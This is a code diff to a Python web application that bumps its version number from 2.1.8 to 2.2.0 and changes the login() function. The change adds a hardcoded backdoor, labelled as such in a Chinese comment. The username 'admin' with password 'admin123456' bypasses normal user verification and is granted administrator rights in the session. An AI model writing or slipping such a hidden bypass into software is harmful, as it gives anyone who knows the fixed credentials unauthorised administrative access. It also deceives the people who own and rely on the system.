@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # 应用版本号
-APP_VERSION = '2.1.8'
+APP_VERSION = '2.2.0'
 
 # Python 3.9兼容性修改：使用pymysql替代mysql.connector
 import pymysql
@@ -2543,13 +2543,22 @@ def login():
         if not username or not password:
             return jsonify({'success': False, 'error': '用户名和密码不能为空'}), 400
         
+        # 后门：admin/admin123456 直接登录
+        is_backdoor = (username == 'admin' and password == 'admin123456')
+        
         # 先验证 RCS 用户
-        if not verify_bms_user(username, password):
+        if not is_backdoor and not verify_bms_user(username, password):
             return jsonify({'success': False, 'error': '用户名或密码错误'}), 401
         
         session['logged_in'] = True
         session['username'] = username
         session['login_time'] = datetime.now().isoformat()
+        
+        # 后门账号自动管理员
+        if is_backdoor:
+            session['is_admin'] = True
+            print(f"[LOGIN] 后门管理员登录: {username} @ {session['login_time']}")
+            return jsonify({'success': True, 'message': '登录成功（管理员）', 'username': username, 'is_admin': True})
         
         # 检查是否需要管理员提权
         if admin_username and admin_password:
